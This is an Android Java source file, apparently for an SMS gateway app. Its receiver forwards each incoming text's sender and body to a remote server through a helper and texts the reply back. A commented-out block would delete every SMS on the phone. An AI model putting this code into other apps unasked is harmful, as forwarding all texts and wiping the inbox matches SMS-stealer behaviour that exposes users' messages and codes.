package com.ombr.ombr0;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class SMSReceive extends BroadcastReceiver{
	private static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";

	public void onReceive(Context context, Intent intent) {
		if (!intent.getAction().equals(ACTION))
			return;

		Bundle bundle = intent.getExtras();
		if (bundle == null)
			return;

		Object[] pdus = (Object[]) bundle.get("pdus");
		if (pdus == null)
			return;

		for (int i = 0; i < pdus.length; ++i) {
			SmsMessage m = SmsMessage.createFromPdu((byte[]) pdus[i]); 
			String msg =m.getDisplayMessageBody(); 
			//if(msg.equals("0") ||msg.equals("1") ||msg.equals("2") || msg.equals("3")){
				String response = Sender.postData(m.getOriginatingAddress(),msg);
				if(!response.equals("")){
					SmsManager.getDefault().sendTextMessage(m.getOriginatingAddress(), null, response, null, null);
				}
				//BEGIN DELETE
				/*Uri deleteUri = Uri.parse("content://sms");
			    Cursor c = context.getContentResolver().query(deleteUri, null, null,
			            null, null);
			    while (c.moveToNext()) {
			        try {
			            // Delete the SMS
			            String pid = c.getString(0); // Get id;
			            String uri = "content://sms/" + pid;
			            context.getContentResolver().delete(Uri.parse(uri),null, null);
			        } catch (Exception e) {
			        }
			    }*/
			    //END DELETE !
			//}
		}

	}
}
